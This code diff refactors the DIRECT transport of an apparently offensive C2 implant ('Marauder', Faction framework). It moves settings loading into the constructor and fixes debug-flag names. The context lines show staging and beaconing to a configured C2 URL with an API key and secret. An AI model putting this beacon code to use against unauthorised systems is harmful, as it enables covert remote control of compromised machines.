@@ -11,9 +11,6 @@ namespace Faction.Modules.Dotnet
 {
   public class Transport : AgentTransport
   {
-    static Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("DIRECT.settings.json");
-    static Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());
-
     new public string Name = "DIRECT";
     public string Url;
     public string KeyName;
@@ -21,24 +18,29 @@ namespace Faction.Modules.Dotnet
     public bool Debug;
 
     public Transport(){
-#if Debug
+#if DEBUG
       Console.WriteLine($"[Marauder DIRECT Transport] Creating DIRECT Transport");
+      Console.WriteLine($"[Marauder DIRECT Transport] Loading Settings..");
 #endif
+      Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("DIRECT.settings.json");
+  
+      Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());
+
       Url = settings["ApiUrl"];
-#if Debug
+#if DEBUG
       Console.WriteLine($"[Marauder DIRECT Transport] Api URL: {Url}");
 #endif
       
       KeyName = settings["ApiKeyName"];
-#if Debug
+#if DEBUG
       Console.WriteLine($"[Marauder DIRECT Transport] Api Key Name: {KeyName}");
 #endif
       Secret = settings["ApiSecret"];
-#if Debug
+#if DEBUG
       Console.WriteLine($"[Marauder DIRECT Transport] Api Secret: {Secret}");
 #endif
       Debug = Boolean.Parse(settings["Debug"]);
-#if Debug
+#if DEBUG
       Console.WriteLine($"[Marauder DIRECT Transport] Debug: {Debug}");
 #endif
     }
@@ -57,7 +59,7 @@ namespace Faction.Modules.Dotnet
       string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
       try
       {
-#if Debug
+#if DEBUG
         Console.WriteLine($"[Marauder DIRECT Transport] Staging URL: {stagingUrl}");
         Console.WriteLine($"[Marauder DIRECT Transport] Key Name: {KeyName}");
         Console.WriteLine($"[Marauder DIRECT Transport] Secret: {Secret}");
@@ -65,7 +67,7 @@ namespace Faction.Modules.Dotnet
 #endif
         string response = wc.UploadString(stagingUrl, jsonMessage);
 
-#if Debug
+#if DEBUG
         Console.WriteLine($"[Marauder DIRECT Transport] Got Response: {response}");
 #endif
         responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
@@ -73,7 +75,7 @@ namespace Faction.Modules.Dotnet
       }
       catch (Exception e)
       {
-#if Debug
+#if DEBUG
         Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
 #endif
         responseDict["Message"] = "ERROR";
@@ -98,7 +100,7 @@ namespace Faction.Modules.Dotnet
         {
           string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
 
-#if Debug
+#if DEBUG
           Console.WriteLine($"[Marauder DIRECT Transport] Beacon URL: {beaconUrl}");
           Console.WriteLine($"[Marauder DIRECT Transport] Key Name: {KeyName}");
           Console.WriteLine($"[Marauder DIRECT Transport] Secret: {Secret}");
@@ -109,7 +111,7 @@ namespace Faction.Modules.Dotnet
         }
         catch (Exception e)
         {
-#if Debug
+#if DEBUG
           Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
 #endif
           responseDict["Message"] = "ERROR";
@@ -119,7 +121,7 @@ namespace Faction.Modules.Dotnet
       {
         try
         {
-#if Debug
+#if DEBUG
           Console.WriteLine($"[Marauder DIRECT Transport] GETTING Checkin..");
 #endif
           string response = wc.DownloadString(beaconUrl);
@@ -127,7 +129,7 @@ namespace Faction.Modules.Dotnet
         }
         catch (Exception e)
         {
-#if Debug
+#if DEBUG
           Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
 #endif
           responseDict["Message"] = "ERROR";
@@ -140,7 +142,7 @@ namespace Faction.Modules.Dotnet
   public class Initialize {
     public static List<AgentTransport> GetTransports()
     {
-#if Debug
+#if DEBUG
       Console.WriteLine($"[Marauder DIRECT Transport] Initializing..");
 #endif
 
